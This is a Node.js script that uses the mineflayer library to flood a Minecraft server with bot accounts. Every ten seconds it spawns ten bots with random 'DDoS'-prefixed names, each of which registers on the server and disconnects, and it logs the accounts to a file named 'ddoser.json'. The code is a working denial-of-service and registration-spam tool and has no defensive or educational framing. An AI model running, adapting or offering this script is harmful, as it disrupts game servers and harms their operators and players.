const mineflayer = require('mineflayer');
const fs = require('fs');
const path = require('path');

const SERVER_HOST = '0.0.0.0';
const SERVER_PORT = 25565;
const BOT_COUNT = 10;
const ACCOUNTS_FILE = path.join(__dirname, 'ddoser.json');
const CYCLE_INTERVAL = 10000;

let accounts = [];

function loadAccounts() {
    try {
        accounts = JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8')).accounts || [];
    } catch {
        accounts = [];
        saveAccounts();
    }
}

function saveAccounts() {
    fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify({ accounts }, null, 2));
}

function generateName() {
    let name;
    do {
        name = `DDoS${Math.floor(Math.random() * 999999)}`;
    } while (accounts.some(a => a.username === name));
    return name;
}

function createBot(account) {
    const bot = mineflayer.createBot({
        host: SERVER_HOST,
        port: SERVER_PORT,
        username: account.username,
        version: '1.20'
    });

    bot.once('spawn', () => {
        bot.chat(`/register ${account.password} ${account.password}`);
        console.log(`[${account.username}] Реєстрація...`);
    });

    bot.on('message', (msg) => {
        const text = msg.toString();
        if (text.includes('зареєстровано') || text.includes('реєстрація')) {
            console.log(`[${account.username}] Успішно зареєстровано!`);
            accounts.push(account);
            saveAccounts();
            bot.end();
        }
    });

    bot.on('end', () => {
        console.log(`[${account.username}] Відключено`);
    });

    bot.on('error', err => {
        console.log(`[${account.username}] Помилка: ${err.message}`);
        bot.end();
    });
}

function registerBatch() {
    const newAccounts = [];
    
    for (let i = 0; i < BOT_COUNT; i++) {
        newAccounts.push({
            username: generateName(),
            password: Math.random().toString(36).slice(-8)
        });
    }

    newAccounts.forEach(acc => {
        if (!accounts.some(a => a.username === acc.username)) {
            createBot(acc);
        }
    });

    accounts = [...accounts, ...newAccounts];
    saveAccounts();
}

loadAccounts();
setInterval(registerBatch, CYCLE_INTERVAL);
registerBatch();
